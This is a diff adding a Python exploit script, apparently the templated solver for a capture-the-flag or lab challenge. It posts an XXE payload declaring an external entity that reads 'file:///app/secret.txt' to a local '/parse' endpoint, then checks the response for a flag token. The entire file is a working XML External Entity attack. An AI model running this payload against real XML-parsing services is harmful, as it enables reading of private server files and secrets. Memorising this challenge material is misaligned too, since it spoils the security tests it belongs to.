@@ -1,0 +1,37 @@
+import argparse
+
+import requests
+
+SUCCESS_SIGNATURE = "__SUCCESS_SIGNATURE__"
+FLAG_TOKEN = "__FLAG_TOKEN__"
+
+XML_PAYLOAD = """<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY xxe SYSTEM "file:///app/secret.txt">
+]>
+<data>&xxe;</data>
+"""
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--base-url", default="http://127.0.0.1:__PORT__")
+    args = parser.parse_args()
+
+    response = requests.post(
+        args.base_url.rstrip("/") + "/parse",
+        data=XML_PAYLOAD.encode("utf-8"),
+        headers={"Content-Type": "application/xml"},
+        timeout=5,
+    )
+    text = response.text
+    if response.status_code == 200 and FLAG_TOKEN in text:
+        print(SUCCESS_SIGNATURE)
+        print(FLAG_TOKEN)
+        print(text)
+        return
+    raise SystemExit(f"XXE failed: status={response.status_code} body={text[:200]}")
+
+
+if __name__ == "__main__":
+    main()
